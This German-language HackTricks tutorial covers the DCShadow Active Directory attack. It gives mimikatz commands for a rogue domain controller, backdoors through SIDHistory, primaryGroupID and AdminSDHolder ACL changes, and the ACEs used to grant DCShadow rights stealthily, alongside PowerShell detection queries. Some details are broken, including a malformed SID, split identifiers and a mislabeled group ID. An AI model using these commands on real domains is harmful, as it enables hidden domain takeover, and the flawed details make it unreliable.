# DCShadow

{{#include ../../banners/hacktricks-training.md}}


## Grundlegende Informationen

Er registriert einen **neuen Domain Controller** in der AD und verwendet ihn, um **push attributes** (SIDHistory, SPNs...) auf bestimmte Objekte anzuwenden, **ohne** dabei irgendwelche **logs** bezüglich der **Änderungen** zu hinterlassen. Du **brauchst DA**-Privilegien und musst dich in der **root domain** befinden.\
Beachte, dass bei Verwendung falscher Daten recht unschöne logs entstehen können.

Um den Angriff durchzuführen, benötigst du 2 mimikatz-Instanzen. Eine davon startet die RPC-Server mit SYSTEM-Privilegien (du musst hier die Änderungen angeben, die du durchführen möchtest), und die andere Instanz wird verwendet, um die Werte zu pushen:
```bash:mimikatz1 (RPC servers)
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```

```bash:mimikatz2 (push) - Needs DA or similar
lsadump::dcshadow /push
```
Beachte, dass **`elevate::token`** in einer `mimikatz1`-Session nicht funktioniert, da damit die Rechte des Threads erhöht werden, wir aber die **Rechte des Prozesses** erhöhen müssen.\
Du kannst auch ein "LDAP"-Objekt auswählen: `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

Du kannst die Änderungen von einem DA oder von einem Benutzer mit diesen minimalen Berechtigungen durchführen:

- Im **Domänenobjekt**:
- _DS-Install-Replica_ (Hinzufügen/Entfernen von Replikaten in der Domäne)
- _DS-Replication-Manage-Topology_ (Verwalten der Replikations-Topologie)
- _DS-Replication-Synchronize_ (Replikationssynchronisation)
- Das **Sites-Objekt** (und seine Kinder) im **Configuration container**:
- _CreateChild and DeleteChild_
- Das Objekt des **Computers, der als DC registriert ist**:
- _WriteProperty_ (Not Write)
- Das **Zielobjekt**:
- _WriteProperty_ (Not Write)

Du kannst [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) verwenden, um einem nicht-privilegierten Benutzer diese Berechtigungen zu geben (beachte, dass dadurch einige Protokolle entstehen). Das ist deutlich restriktiver als DA-Rechte.\
Zum Beispiel: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` Das bedeutet, dass der Benutzername _**student1**_, wenn er auf der Maschine _**mcorp-student1**_ angemeldet ist, DCShadow-Berechtigungen für das Objekt _**root1user**_ hat.

## DCShadow verwenden, um Backdoors zu erstellen
```bash:Set Enterprise Admins in SIDHistory to a user
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```

```bash:Chage PrimaryGroupID (put user as member of Domain Administrators)
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```

```bash:Modify ntSecurityDescriptor of AdminSDHolder (give Full Control to a user)
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
### Missbrauch der primären Gruppe, Aufzählungslücken und Erkennung

- `primaryGroupID` ist ein separates Attribut zur Gruppen-`member`-Liste. DCShadow/DSInternals können es direkt schreiben (z. B. `primaryGroupID=512` für **Domain Admins**) ohne lokale LSASS-Durchsetzung, aber AD verschiebt den Benutzer trotzdem: Ändern der PGID entfernt immer die Mitgliedschaft aus der vorherigen primären Gruppe (gleiches Verhalten für jede Zielgruppe), daher kann man die alte primäre-Gruppen-Mitgliedschaft nicht behalten.
- Standardwerkzeuge verhindern, dass ein Benutzer aus seiner aktuellen primären Gruppe entfernt wird (`ADUC`, `Remove-ADGroupMember`), daher erfordert das Ändern der PGID typischerweise direkte Verzeichnis-Schreibvorgänge (DCShadow/`Set-ADDBPrimaryGroup`).
- Die Mitgliedschaftsberichterstattung ist inkonsistent:
- **Beinhaltet** aus der primären Gruppe abgeleitete Mitglieder: `Get-ADGroupMember "Domain Admins"`, `net group "Domain Admins"`, ADUC/Admin Center.
- **Schließt** primärgruppen-abgeleitete Mitglieder aus: `Get-ADGroup "Domain Admins" -Properties member`, ADSI Edit inspecting `member`, `Get-ADUser <user> -Properties memberOf`.
- Rekursive Prüfungen können primärgruppen-Mitglieder übersehen, wenn die **primäre Gruppe selbst verschachtelt ist** (z. B. zeigt die PGID des Benutzers auf eine innerhalb von Domain Admins verschachtelte Gruppe); `Get-ADGroupMember -Recursive` oder LDAP-rekursive Filter geben diesen Benutzer nicht zurück, sofern die Rekursion nicht explizit primäre Gruppen auflöst.
- DACL-Tricks: Angreifer können **deny ReadProperty** auf `primaryGroupID` beim Benutzer (oder auf das Gruppen-`member`-Attribut für Nicht-AdminSDHolder-Gruppen) setzen, wodurch die effektive Mitgliedschaft vor den meisten PowerShell-Abfragen verborgen wird; `net group` löst die Mitgliedschaft dennoch auf. AdminSDHolder-geschützte Gruppen setzen solche Verweigerungen zurück.

Detection/monitoring examples:
```powershell
# Find users whose primary group is not the default Domain Users (RID 513)
Get-ADUser -Filter * -Properties primaryGroup,primaryGroupID |
Where-Object { $_.primaryGroupID -ne 513 } |
Select-Object Name,SamAccountName,primaryGroupID,primaryGroup
```

```powershell
# Find users where primaryGroupID cannot be read (likely denied via DACL)
Get-ADUser -Filter * -Properties primaryGroupID |
Where-Object { -not $_.primaryGroupID } |
Select-Object Name,SamAccountName
```
Prüfe privilegierte Gruppen, indem du die Ausgabe von `Get-ADGroupMember` mit `Get-ADGroup -Properties member` oder ADSI Edit vergleichst, um Diskrepanzen zu erkennen, die durch `primaryGroupID` oder versteckte Attribute verursacht werden.

## Shadowception - DCShadow-Berechtigungen mit DCShadow vergeben (keine modifizierten Berechtigungsprotokolle)

Wir müssen die folgenden ACEs anhängen, wobei am Ende die SID unseres Benutzers steht:

- Auf dem Domainobjekt:
- `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
- `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- Auf dem Angreifer-Computerobjekt: `(A;;WP;;;UserSID)`
- Auf dem Ziel-Benutzerobjekt: `(A;;WP;;;UserSID)`
- Auf dem Sites-Objekt im Configuration-Container: `(A;CI;CCDC;;;UserSID)`

Um die aktuelle ACE eines Objekts zu erhalten: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`

Beachte, dass du in diesem Fall mehrere Änderungen vornehmen musst, nicht nur eine. Daher verwende in der **mimikatz1 session** (RPC server) den Parameter **`/stack` mit jeder Änderung**, die du durchführen möchtest. Auf diese Weise musst du nur einmal **`/push`** ausführen, um alle gestapelten Änderungen auf dem Rogue-Server umzusetzen.

[**More information about DCShadow in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)

## Referenzen

- [TrustedSec - Adventures in Primary Group Behavior, Reporting, and Exploitation](https://trustedsec.com/blog/adventures-in-primary-group-behavior-reporting-and-exploitation)
- [DCShadow write-up in ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)

{{#include ../../banners/hacktricks-training.md}}
